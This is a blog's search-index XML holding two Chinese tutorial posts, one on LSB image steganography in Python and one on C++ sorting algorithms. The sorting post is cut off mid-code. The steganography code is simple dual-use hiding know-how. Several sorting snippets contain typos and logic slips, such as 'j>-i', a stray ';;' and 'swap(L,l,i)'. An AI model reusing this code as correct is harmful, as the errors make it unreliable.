<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>python实现LSB算法</title>
    <link href="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="python实现LSB算法"><a href="#python实现LSB算法" class="headerlink" title="python实现LSB算法"></a>python实现LSB算法</h1><h2 id="一、LSB算法简介"><a href="#一、LSB算法简介" class="headerlink" title="一、LSB算法简介"></a>一、LSB算法简介</h2><p>LSB算法实现信息隐藏就是把秘密信息存放到最低有效位。</p><p>举个例子，一张灰度图片，图片是由一个个像素点组成的，而一个灰度图片的像素点来说，它的一个像素点共有8位，所以一个像素点的值的取值范围就是[0,255]，而数值的大小影响到图片的灰度。如果对于一个像素点，他的值是：00010011，他的值是19，如果我们对它的最高值进行修改：0→1，那对这个数值的影响是很大的，直接增加了2^7^，对图片的影响很大，但是如果我们对它的最低位进行修改，数值仅仅只变化了1，对图片的影响很小。正是根据这一点，我们可以用它来进行信息隐藏，我们把信息变成01比特流，把它放在每一个像素点的最低位，进行隐藏；然后需要提取信息出来的时候，我们只需要把每个像素点的最后一个比特取出来，然后组合起来，就可以得到原始的数据。</p><h2 id="二、具体实现"><a href="#二、具体实现" class="headerlink" title="二、具体实现"></a>二、具体实现</h2><p>为了更好对图片进行处理，这里使用了python里面的一个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br></code></pre></td></tr></table></figure><h3 id="2-1-从文件中读取想要隐藏的信息"><a href="#2-1-从文件中读取想要隐藏的信息" class="headerlink" title="2.1 从文件中读取想要隐藏的信息"></a>2.1 从文件中读取想要隐藏的信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_secret_msg</span>():<br>    file = <span class="hljs-built_in">open</span>(secret_msg_path, <span class="hljs-string">&quot;r&quot;</span>)<br>    secret_msg = file.read()<br>    file.close()<br>    <span class="hljs-keyword">return</span> secret_msg<br></code></pre></td></tr></table></figure><p>打开<strong>secret_msg_path</strong>文件，然后将文件里面的内容读取出来，由<strong>secret_msg</strong>保存，此时<strong>secret_msg</strong>是字符串类型</p><h3 id="2-2-字符串转化为二进制字符串"><a href="#2-2-字符串转化为二进制字符串" class="headerlink" title="2.2 字符串转化为二进制字符串"></a>2.2 字符串转化为二进制字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">msg_invert_binarystream</span>(<span class="hljs-params">secret_msg</span>):<br>    binarystream = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> secret_msg:<br>        <span class="hljs-comment"># ord()将字符转化成十进制数</span><br>        <span class="hljs-comment"># bin()将数字转化为字符串</span><br>        <span class="hljs-comment"># &gt;&gt;&gt;bin(10)</span><br>        <span class="hljs-comment"># &quot;0b1010&quot;</span><br>        binarystream += <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(elem)).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> binarystream<br></code></pre></td></tr></table></figure><p>将字符串转化为01比特流，一个字符对应的是8字节，只需要一个字节一个字节的读取<strong>secret_msg</strong>的内容即可</p><p><strong>ord（）：根据ASCII码表将字符转变成它对应的十进制数，比如：ord(a)=97</strong></p><p><strong>bin（）：将数字变成字符串类型，比如：bin(10)=”0b10”</strong></p><p>正是因为<strong>bin()</strong>转化为字符串类型后会默认的在字符串首部添加字符串”0b”，所以我们用replace()进行除去”0b”的操作</p><p>最后，<strong>zfill(8)</strong>填充字符串为8位，不足8位的用0补充，一个字符对应8个bit，便于我们后续的处理。</p><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329145909319.png" alt="ASCII码表"></p><h3 id="2-3-读取图片信息"><a href="#2-3-读取图片信息" class="headerlink" title="2.3 读取图片信息"></a>2.3 读取图片信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_init_bmp</span>():<br>    init_bmp = Image.<span class="hljs-built_in">open</span>(init_bmp_path, <span class="hljs-string">&quot;r&quot;</span>)<br>    width = init_bmp.size[<span class="hljs-number">0</span>]<br>    height = init_bmp.size[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 是否是512*512大小的</span><br>    <span class="hljs-keyword">if</span> width != <span class="hljs-number">512</span> <span class="hljs-keyword">and</span> height != <span class="hljs-number">512</span>:<br>        init_bmp = init_bmp.resize((<span class="hljs-number">512</span>, <span class="hljs-number">512</span>))<br>    <span class="hljs-comment"># 是否是灰度图片</span><br>    <span class="hljs-keyword">if</span> init_bmp.mode != <span class="hljs-string">&quot;L&quot;</span>:<br>        init_bmp = init_bmp.convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    <span class="hljs-keyword">return</span> init_bmp<br></code></pre></td></tr></table></figure><p><strong>Image.open()函数用于获取图片数据，存放在init_bmp中</strong></p><p><strong>init_bmp.size[0]：返回图片的宽度</strong></p><p><strong>init_bmp.size[1]：返回图片的高度</strong></p><p>这是为了后续我们的定位</p><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329150533643.png" alt="宽度和高度"></p><h3 id="2-4-对某个像素的灰度值的最低位进行嵌入"><a href="#2-4-对某个像素的灰度值的最低位进行嵌入" class="headerlink" title="2.4 对某个像素的灰度值的最低位进行嵌入"></a>2.4 对某个像素的灰度值的最低位进行嵌入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hid_lsb</span>(<span class="hljs-params">gray_scale_value, hid_bit</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">bin</span>(gray_scale_value).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    lsb = <span class="hljs-built_in">str</span>[<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> lsb != hid_bit:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>] + hid_bit<br>    <span class="hljs-comment"># 最终返回的是0-255之间的数值，传入的gray_scale_value是0-255之间的数值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>, <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p><strong>gray_scale_value：像素值，例如：00101101</strong></p><p><strong>int(str,2)：是将str转化为int型，2代表以2进制的形式展示</strong></p><h3 id="2-5-对某个像素的灰度值的最低位进行提取"><a href="#2-5-对某个像素的灰度值的最低位进行提取" class="headerlink" title="2.5 对某个像素的灰度值的最低位进行提取"></a>2.5 对某个像素的灰度值的最低位进行提取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lsb</span>(<span class="hljs-params">gray_scale_value</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">bin</span>(gray_scale_value).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>[<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p><strong>get_lsb()：获取gray_scale_value的最低位，返回的是一个字符</strong></p><h3 id="2-6-隐藏信息算法"><a href="#2-6-隐藏信息算法" class="headerlink" title="2.6 隐藏信息算法"></a>2.6 隐藏信息算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_msg_in_init_bmp</span>(<span class="hljs-params">secret_msg, init_bmp</span>):<br>    hid_img = init_bmp.copy()<br>    width = hid_img.size[<span class="hljs-number">0</span>]<br>    height = hid_img.size[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 隐藏信息变成二进制字符串形式</span><br>    binarystream = msg_invert_binarystream(secret_msg)<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>            <span class="hljs-comment"># 所有secret_msg均已隐藏完毕</span><br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(binarystream):<br>                <span class="hljs-keyword">break</span><br>            gray_scale_value = hid_img.getpixel((w, h))<br>            after_hid_value = hid_lsb(gray_scale_value, binarystream[i])<br>            hid_img.putpixel((w, h), after_hid_value)<br>            i = i+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> hid_img<br></code></pre></td></tr></table></figure><p>有了之前的工作，现在只需要调用他们就可以完成信息的隐藏了，先把隐藏信息读取出来，变成二进制字符串形式，然后一个一个像素点的进行信息的嵌入，然后返回嵌入完毕的图片即可</p><h3 id="2-7-提取信息算法"><a href="#2-7-提取信息算法" class="headerlink" title="2.7 提取信息算法"></a>2.7 提取信息算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_msg_from_bmp</span>(<span class="hljs-params">hid_bmp, secret_msg_len</span>):<br>    width = hid_bmp.size[<span class="hljs-number">0</span>]<br>    height = hid_bmp.size[<span class="hljs-number">1</span>]<br>    ret_str = <span class="hljs-string">&quot;&quot;</span><br>    eight_bit_str = <span class="hljs-string">&quot;&quot;</span><br>    cnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>            gray_scale_value = hid_bmp.getpixel((w, h))<br>            eight_bit_str += get_lsb(gray_scale_value)<br>            <span class="hljs-comment"># 转换成一个字符</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(eight_bit_str) == <span class="hljs-number">8</span>:<br>                tmp_ch = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(eight_bit_str, <span class="hljs-number">2</span>))<br>                cnt += <span class="hljs-number">1</span><br>                ret_str += tmp_ch<br>                eight_bit_str = <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-keyword">if</span> cnt == secret_msg_len:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> cnt == secret_msg_len:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> ret_str<br></code></pre></td></tr></table></figure><p>跟隐藏信息算法相似，只是现在是把一个一个像素点的最低位读取出来，然后因为8bit对应一个字符，所以凑足8比特之后，我们就对它进行一个转化。</p><h2 id="三、实现效果"><a href="#三、实现效果" class="headerlink" title="三、实现效果"></a>三、实现效果</h2><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329151644327.png" alt="运行结果"></p><h2 id="四、思考"><a href="#四、思考" class="headerlink" title="四、思考"></a>四、思考</h2><p>我们实现的LSB算法存入隐藏信息选择的像素点，是依照次序的，也就是说如果第二个像素点隐藏了信息，那第一个像素点也隐藏了信息，那我们对它的破解只需要对每个像素点的最后一位读取出来，然后进行组合，然后翻译一下就可以得到隐藏信息了，但是实际中我可以不按照顺序进行信息的隐藏，比如我选择了第1个像素点之后，下一个隐藏的像素点我选择第3个像素点，然后选择第5个……这样破解起来难度就会增大一些。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>排序</title>
    <link href="/2023/03/27/%E6%8E%92%E5%BA%8F/"/>
    <url>/2023/03/27/%E6%8E%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327202459096.png" alt="image-20230327202459096"></p><h3 id="1-2-稳定性"><a href="#1-2-稳定性" class="headerlink" title="1.2 稳定性"></a>1.2 稳定性</h3><p>假设K~i~=K~j~（1&lt;=i&lt;=n,i&lt;=j&lt;=n,i!=j)且在排序前的序列中r~i~领先于r~j~，如果排序后r~i~仍领先于r~j~，则所用的排序是稳定的；反之，若可能使得排序后的序列中r~j~领先于r~i~，则称所用的排序方法是不稳定的。</p><p>如下图：</p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327202820013.png" alt="稳定性"></p><h3 id="1-3-内排序与外排序"><a href="#1-3-内排序与外排序" class="headerlink" title="1.3 内排序与外排序"></a>1.3 内排序与外排序</h3><p>内排序是在排序整个过程中，待排序的所有记录全部被放置在内存中。外排序是由于排序的记录个数太多，不能同时放置在内存，整个排序过程需要在内外存之间多次交换数据才能进行。</p><p>排序算法的性能主要受3个方面影响：<code>时间性能</code>，<code>辅助空间</code>，<code>算法的复杂度</code></p><p><strong>内排序分为：插入排序，交换排序，选择排序和归并排序</strong></p><h2 id="二、冒泡排序"><a href="#二、冒泡排序" class="headerlink" title="二、冒泡排序"></a>二、冒泡排序</h2><p>基本思想：两两比较相邻记录的关键字，如果反序则交换，知道没有反序的记录为止。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//不是那么标准的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbSort0</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;i++)&#123;<br>        <span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L-&gt;length;j++)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[i]&gt;L-&gt;r[j])<br>            <span class="hljs-built_in">swap</span>(L,i,j);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//正宗的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbleSort</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;i++)&#123;<br>        <span class="hljs-keyword">for</span>(j=L-&gt;length<span class="hljs-number">-1</span>;j&gt;=i;j--)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[j]&gt;L-&gt;r[j+<span class="hljs-number">1</span>])<br>                <span class="hljs-built_in">swap</span>(L,j,j+<span class="hljs-number">1</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//改进的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbleSort2</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    Status flag=TRUE;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length&amp;&amp;flag;i++)&#123;<br>        flag=FALSE;<br>        <span class="hljs-keyword">for</span>(j=L-&gt;length<span class="hljs-number">-1</span>;j&gt;-i;j--)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[j]&gt;L-&gt;r[j+<span class="hljs-number">1</span>])<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(L,j,j+<span class="hljs-number">1</span>);<br>                flag=TRUE;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327231053615.png" alt="冒泡排序"></p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190446264.gif" alt="冒泡排序"></p><p>最坏时间复杂度：O(n^2^)</p><p>最好时间复杂度：O(n)</p><p><strong>总的时间复杂度：O（n^2^)</strong></p><h2 id="三、简单选择排序"><a href="#三、简单选择排序" class="headerlink" title="三、简单选择排序"></a>三、简单选择排序</h2><p><strong>简单选择排序法就是通过n-i次关键字间的比较，从n-i+1个记录中选出关键字最小的记录，并和第i个记录交换之</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j,min;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;;i++)&#123;<br>        min=i;<br>        <span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L-&gt;length;j++)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[min]&gt;L-&gt;r[j])<br>                min=j;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-built_in">swap</span>(L,i,min);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190545640.gif" alt="简单选择排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n^2^)</p><p>简单选择排序过程，最大特点就是交换移动数据次数相当少，节约了相应时间，总的时间复杂度为：O（n^2^)</p><h2 id="四、直接插入排序"><a href="#四、直接插入排序" class="headerlink" title="四、直接插入排序"></a>四、直接插入排序</h2><p>直接插入排序的基本操作是将一个记录插入到已经排好序的有序表中，从而得到一个新的，记录数增1的有序表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> l)</span></span>&#123;<br>    <span class="hljs-type">int</span> temp;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;l;i++)&#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;a[i<span class="hljs-number">-1</span>])&#123;<br>            temp=a[i];<br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">0</span>&amp;&amp;temp&lt;a[j];j--)&#123;<br>                a[j+<span class="hljs-number">1</span>]=a[j];<br>            &#125;<br>            a[j+<span class="hljs-number">1</span>]=temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210223174254141.gif" alt="直接插入排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n)</p><p>直接插入排序总的时间复杂度为O(n^2^)</p><h2 id="五、选择排序"><a href="#五、选择排序" class="headerlink" title="五、选择排序"></a>五、选择排序</h2><p>基本思想：每次从待排序列中选出一个最小值，然后放在序列的起始位置，直到全部待排数据排完即可。实际上我们可以选择两个值，一个最大值， 一个最小值，然后将其放在序列开头和结尾，这样可以使选择排序的效率快一倍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-type">int</span> *arr,<span class="hljs-type">int</span> n)</span></span>&#123;<br>    <span class="hljs-type">int</span> begin=<span class="hljs-number">0</span>,end=n<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(begin&lt;end)&#123;<br>        <span class="hljs-type">int</span> maxi=begin;<br>        <span class="hljs-type">int</span> mini=begin;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=begin;i&lt;=end;i++)&#123;<br>            <span class="hljs-keyword">if</span>(arr[i]&lt;arr[mini])&#123;<br>                mini=i;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(arr[i]&gt;arr[maxi])&#123;<br>                maxi=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(arr[mini],arr[begin]);<br>        <span class="hljs-comment">//防止最大数在开头被换走</span><br>        <span class="hljs-keyword">if</span>(begin==maxi)&#123;<br>            maxi=mini;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(arr[maxi],arr[end]);<br>        begin++;<br>        end--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190545640.gif" alt="选择排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n^2^)</p><p>总的时间复杂度为：O(n^2^)</p><h2 id="六、希尔排序"><a href="#六、希尔排序" class="headerlink" title="六、希尔排序"></a>六、希尔排序</h2><p><strong>基本思想：先选定一个小于N的整数gap作为第一增量，然后将所有距离为gap的元素分在同一组，并对每一组的元素进行直接插入排序，然后再取一个比第一增量小的整数作为第二增量，重复上述操作……</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShellSort</span><span class="hljs-params">(<span class="hljs-type">int</span>*arr,<span class="hljs-type">int</span> n)</span></span>&#123;<br>    <span class="hljs-type">int</span> gap=n;<br>    <span class="hljs-keyword">while</span>(gap&gt;<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">//每次对gap折半操作</span><br>        gap=gap/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n-gap;i++)&#123;<br>            <span class="hljs-type">int</span> end=i;<br>            <span class="hljs-type">int</span> tem=arr[end+gap];<br>            <span class="hljs-keyword">while</span>(end&gt;=<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">if</span>(tem&lt;arr[end])&#123;<br>                    arr[end+gap]=arr[end];<br>                    end-=gap;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            arr[end+gap]=tem;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190237603.gif" alt="希尔排序"></p><p><strong>增量(gap)的选择非常重要，增量序列的最后一个增量值必须等于1才行</strong>，并且由于记录是跳跃式的移动，希尔排序不是一种稳定的排序。</p><p>总的时间复杂度：O(n^1.3^)</p><h2 id="七、堆排序"><a href="#七、堆排序" class="headerlink" title="七、堆排序"></a>七、堆排序</h2><p>堆是具有下列性质的完全二叉树：每个结点的值都大于或者等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。</p><p>基本思想：将带排序的序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点，将它移走(其实就是将其与堆数组的末尾元素交换，此时末尾元素就是最大值)，然后将剩余的n-1个序列重新构造成一个堆，这样就会得到n个元素中的次小值。如此反复执行，就可以得到一个有序序列了。</p><p>难点在于：</p><p>（1）如何把一个无序序列构建成一个堆？</p><p>（2）如果在输出堆顶元素之后，调整剩余元素成为一个新的堆？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapSort</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=L-&gt;length/<span class="hljs-number">2</span>;i&gt;<span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-built_in">HeapAdjust</span>(L,i,L-&gt;length);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=L-&gt;length;i&gt;<span class="hljs-number">1</span>;i--)&#123;<br>        <span class="hljs-built_in">swap</span>(L,l,i);<br>        <span class="hljs-built_in">HeapAdjust</span>(L,l,i<span class="hljs-number">-1</span>);<br>    